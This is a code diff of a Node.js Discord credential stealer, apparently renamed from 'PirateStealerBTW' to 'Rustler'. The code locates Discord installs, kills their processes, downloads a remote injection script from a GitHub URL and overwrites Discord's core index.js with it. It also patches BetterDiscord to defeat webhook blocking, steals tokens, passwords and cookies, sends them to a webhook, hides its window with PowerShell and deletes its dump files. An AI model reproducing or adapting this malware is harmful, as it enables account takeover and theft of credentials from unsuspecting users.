@@ -4,17 +4,18 @@ var glob = require("glob");
 const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
+var request = require('sync-request');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
 
 const config = {
-    "logout": "%LOGOUT%1",
-    "inject-notify": "%INJECTNOTI%1",
-    "logout-notify": "%LOGOUTNOTI%1",
-    "init-notify":"%INITNOTI%1",
-    "embed-color": 3553599,
-    "disable-qr-code": "%DISABLEQRCODE%1"
+    "logout": "%LOGOUT%",
+    "inject-notify": "%INJECTNOTI%",
+    "logout-notify": "%LOGOUTNOTI%",
+    "init-notify":"%INITNOTI%",
+    "embed-color": 240000,
+    "disable-qr-code": "%DISABLEQRCODE%"
 }
 
 
@@ -24,8 +25,7 @@ var LOCAL = process.env.LOCALAPPDATA
 var discords = [];
 var injectPath = [];
 var runningDiscords = [];
-
-
+ 
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
         discords.push(LOCAL + '\\' + file)
@@ -38,20 +38,25 @@ discords.forEach(function(file) {
     let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
     glob.sync(pattern).map(file => {
         injectPath.push(file)
+listDiscords();
     })
     
 });
-
+takePizzas();
+takeCheese();
+stealTokens()
+removePizzas();
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection', (resp) => {
+   // console.log(`Starting Game...`);
+    https.get("https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection-clean", (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -61,62 +66,33 @@ function Infect() {
                         fs.mkdirSync(init, 0744)
                     }
                 }
-                if ( config.logout != "false" ) {
-
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                if (config.logout != "false") {
+                    let folder = file.replace("index.js", "Rustler")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
                             startDiscord();
                         }
-                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
+                    } else if (fs.existsSync(folder) && config.logout == "instant") {
                         startDiscord();
                     }
                 }
             })
-            
         });
     }).on("error", (err) => {
         console.log(err);
     });
 };
 
-
 function listDiscords() {
-    exec('tasklist', function(err,stdout, stderr) {
-
-        
-        if (stdout.includes("Discord.exe")) {
-
-            runningDiscords.push("discord")
-        }
-        if (stdout.includes("DiscordCanary.exe")) {
-
-            runningDiscords.push("discordcanary")
-        }
-        if (stdout.includes("DiscordDevelopment.exe")) {
-
-            runningDiscords.push("discorddevelopment")
-        }
-        if (stdout.includes("DiscordPTB.exe")) {
-
-            runningDiscords.push("discordptb")
-        };
-        if (config.logout == "instant") {
-            killDiscord();
-        } else {
-            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
-                injectNotify();
-            }
-            Infect()
-            pwnBetterDiscord()
-        }
-    })
-
-
-   
+    exec('tasklist', function (err, stdout, stderr) {
+        if (stdout.includes('Discord.exe')) runningDiscords.push('Discord');
+        if (stdout.includes('DiscordCanary.exe')) runningDiscords.push('DiscordCanary');
+        if (stdout.includes('DiscordPTB.exe')) runningDiscords.push('DiscordPTB');
+        if (stdout.includes('DiscordDevelopment.exe')) runningDiscords.push('DiscordDevelopment');
+        killDiscord();
+    });
 };
-
 function killDiscord() {
     runningDiscords.forEach(disc => {
         exec(`taskkill /IM ${disc}.exe /F`, (err) => {
@@ -125,35 +101,34 @@ function killDiscord() {
             }
           });
     });
-    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
-        injectNotify();
-    }
 
     Infect()
     pwnBetterDiscord()
 };
 
 function startDiscord() {
-    runningDiscords.forEach(disc => {
-        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
-        exec(path, (err) => {
-            if (err) {
-              return;
-            }
-          });
-    });
+        runningDiscords.forEach(disc => {
+           // console.log('Starting game paths...');
+            try {
+                exec(localappdata + '\\' + disc + '\\Update.exe' + ' --processStart ' + disc + '.exe', err => {
+                    if (err) {
+                        if (debug) console.log(err);
+                    }
+                });
+            } catch (e) {}
+        });
 };
 function pwnBetterDiscord() {
     // thx stanley
     var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
         var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "kkkkk"))
     } else {
         return;
     }
-
 }
+
 async function getPizzas(path) {
     let path_split = path.split('\\'),
         path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
@@ -348,7 +323,7 @@ async function stealTokens() {
         });
     }
 
-axios.post(webhook, {
+    axios.post(webhook, {
         "content": null,
         "embeds": [
           {
@@ -381,6 +356,7 @@ axios.post(webhook, {
     }) .then(res => {}).catch(error => {})
     
 }
+
 function hideSelf() {
     let payload = '\n' +
         "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
@@ -414,4 +390,12 @@ function sleep(ms) {
 
   function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
+}
+
+async function removePizzas() {
+    await sleep(1000);
+    fs.unlinkSync(appdata+"\\passwords.txt");
+    fs.unlinkSync(appdata+"\\cookies.txt");
+    fs.unlinkSync(appdata+"\\src-passwords.txt");
+    fs.unlinkSync(appdata+"\\src-cookies.txt");
 }
